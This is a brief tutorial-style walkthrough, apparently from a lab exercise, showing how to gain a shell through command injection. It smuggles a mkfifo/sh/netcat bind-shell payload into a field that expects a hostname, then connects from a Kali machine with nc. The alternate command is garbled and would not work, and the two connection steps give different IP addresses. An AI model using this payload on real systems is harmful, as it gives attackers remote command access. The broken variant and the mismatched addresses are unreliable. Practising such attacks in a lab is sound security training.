Trying to gain shell access
Lets get a shell using sh and listen using netcat at port 4444.
To run shell and listen to the port simultaneously we need to pipe them in a file using mkfifo
So weâ€™ll be using this command:
www.google.com;mkfifo /tmp/pipe;sh /tmp/pipe | nc -l 4444 > /tmp/pipe
or www.google.com;mkfifo/tmp/pipe;sh/temp/pipe|nc-| 4444
Open kali
Open kali terminal
Now return to kali linux and open terminal.
Type: nc 192.168.29.185 4444 to connect to port 4444 and get shell access.
In terminal: sudo nc 192.168.73.129 4444
